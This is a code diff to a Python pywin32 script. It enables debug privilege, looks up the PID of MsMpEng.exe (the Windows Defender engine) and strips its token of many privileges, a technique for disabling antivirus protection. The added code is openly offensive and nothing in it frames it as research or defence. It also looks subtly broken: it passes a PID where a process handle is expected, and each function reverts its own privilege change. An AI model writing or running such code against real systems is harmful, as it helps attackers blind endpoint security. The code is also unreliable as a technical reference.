@@ -10,6 +10,7 @@ TOKEN_QUERY = win32security.TOKEN_QUERY
 TOKEN_ADJUST_PRIVILEGES = win32security.TOKEN_ADJUST_PRIVILEGES
 TOKEN_ALL_ACCESS = win32security.TOKEN_ALL_ACCESS
 SE_PRIVILEGE_ENABLED = win32security.SE_PRIVILEGE_ENABLED
+SE_PRIVILEGE_REMOVED = win32security.SE_PRIVILEGE_REMOVED
 
 # NT Defined Privileges
 
@@ -37,17 +38,21 @@ SE_AUDIT_NAME                     = "SeAuditPrivilege"
 SE_SYSTEM_ENVIRONMENT_NAME        = "SeSystemEnvironmentPrivilege"
 SE_CHANGE_NOTIFY_NAME             = "SeChangeNotifyPrivilege"
 SE_REMOTE_SHUTDOWN_NAME           = "SeRemoteShutdownPrivilege"
+SE_IMPERSONATE_NAME               = "SeImpersonatePrivilege"
+
+SECURITY_MANDATORY_UNTRUSTED_RID  = 0x2010
 
 
 def enable_debug_privilege():
     new_privs = (
-        (win32security.LookupPrivilegeValue('', SE_SECURITY_NAME),win32security.SE_PRIVILEGE_ENABLED),
-        (win32security.LookupPrivilegeValue('', SE_RESTORE_NAME),win32security.SE_PRIVILEGE_ENABLED),
+        (win32security.LookupPrivilegeValue('', SE_DEBUG_NAME),win32security.SE_PRIVILEGE_ENABLED),
+        (win32security.LookupPrivilegeValue('', SE_CHANGE_NOTIFY_NAME),win32security.SE_PRIVILEGE_ENABLED),
     )
     ph = win32api.GetCurrentProcess()
     th = win32security.OpenProcessToken(ph, TOKEN_ALL_ACCESS|TOKEN_ADJUST_PRIVILEGES)
     modified_privs = win32security.AdjustTokenPrivileges(th, 0, new_privs)
     win32security.AdjustTokenPrivileges(th, 0, modified_privs)
+    print("Debug privileges have been enabled!")
 
 def get_all_processes():
     c = wmi.WMI(find_classes=False)
@@ -71,12 +76,35 @@ def get_pid(process_name):
     return pid
 
 def set_privilege_none(pid):
-    token = win32security.OpenProcessToken(pid, TOKEN_ALL_ACCESS)
-    win32security.AdjustTokenPrivileges(token, 1, None)
-    pass
+    # Local Priv, Priv To Lookup, LUID of Priv
+    new_privs = (
+        (win32security.LookupPrivilegeValue('', SE_SECURITY_NAME),win32security.SE_PRIVILEGE_REMOVED),
+        (win32security.LookupPrivilegeValue('', SE_CHANGE_NOTIFY_NAME),win32security.SE_PRIVILEGE_REMOVED),
+        (win32security.LookupPrivilegeValue('', SE_TCB_NAME),win32security.SE_PRIVILEGE_REMOVED),
+        (win32security.LookupPrivilegeValue('', SE_IMPERSONATE_NAME),win32security.SE_PRIVILEGE_REMOVED),
+        (win32security.LookupPrivilegeValue('', SE_LOAD_DRIVER_NAME),win32security.SE_PRIVILEGE_REMOVED),
+        (win32security.LookupPrivilegeValue('', SE_RESTORE_NAME),win32security.SE_PRIVILEGE_REMOVED),
+        (win32security.LookupPrivilegeValue('', SE_BACKUP_NAME),win32security.SE_PRIVILEGE_REMOVED),
+        (win32security.LookupPrivilegeValue('', SE_SECURITY_NAME),win32security.SE_PRIVILEGE_REMOVED),
+        (win32security.LookupPrivilegeValue('', SE_SYSTEM_ENVIRONMENT_NAME),win32security.SE_PRIVILEGE_REMOVED),
+        (win32security.LookupPrivilegeValue('', SE_INCREASE_QUOTA_NAME),win32security.SE_PRIVILEGE_REMOVED),
+        (win32security.LookupPrivilegeValue('', SE_TAKE_OWNERSHIP_NAME),win32security.SE_PRIVILEGE_REMOVED),
+        (win32security.LookupPrivilegeValue('', SE_INC_BASE_PRIORITY_NAME),win32security.SE_PRIVILEGE_REMOVED),
+        (win32security.LookupPrivilegeValue('', SE_SHUTDOWN_NAME),win32security.SE_PRIVILEGE_REMOVED),
+        (win32security.LookupPrivilegeValue('', SE_ASSIGNPRIMARYTOKEN_NAME),win32security.SE_PRIVILEGE_REMOVED),
+    )
+
+    #ph = win32api.OpenProcess(TOKEN_ALL_ACCESS|TOKEN_ADJUST_PRIVILEGES, 1, pid)
+    th = win32security.OpenProcessToken(pid, TOKEN_ALL_ACCESS)
+    modified_privs = win32security.AdjustTokenPrivileges(th, 0, new_privs)
+    win32security.AdjustTokenPrivileges(th, 0, modified_privs)
+    print("Selected process has been stripped of privileges.")
+    
 
 def main():
     enable_debug_privilege()
+    process_id = get_pid("MsMpEng.exe")
+    set_privilege_none(process_id)
 
 if __name__=="__main__":
     main()
